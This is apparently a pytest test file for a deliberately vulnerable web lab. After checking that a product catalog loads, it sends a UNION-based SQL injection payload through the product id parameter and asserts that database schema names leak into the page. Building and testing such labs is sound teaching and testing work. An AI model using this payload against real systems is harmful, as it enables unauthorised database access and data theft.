import os
import time
import pytest
import requests

BASE_URL = os.environ.get('LAB_BASE_URL', 'http://localhost:5000')

def wait_for_app():
    for _ in range(30):
        try:
            r = requests.get(f'{BASE_URL}/lab')
            if r.status_code == 200:
                return
        except Exception:
            pass
        time.sleep(1)
    raise RuntimeError('App did not start in time')

@pytest.fixture(scope='session', autouse=True)
def setup():
    wait_for_app()

def test_lab_lists_products():
    r = requests.get(f'{BASE_URL}/lab')
    assert r.status_code == 200
    assert 'Product Catalog' in r.text
    assert 'Acme Widget' in r.text

def test_lab_product_details():
    r = requests.get(f'{BASE_URL}/lab/product?id=1')
    assert r.status_code == 200
    assert 'Acme Widget' in r.text

def test_sql_injection_extracts_db_names():
    # Try a UNION-based SQLi to extract database names
    payload = '1 UNION SELECT NULL, schema_name, NULL, NULL FROM information_schema.schemata LIMIT 1,1 -- '
    r = requests.get(f'{BASE_URL}/lab/product?id={payload}')
    assert r.status_code == 200
    # Should see a default MySQL db name in the response
    assert 'information_schema' in r.text or 'mysql' in r.text or 'performance_schema' in r.text 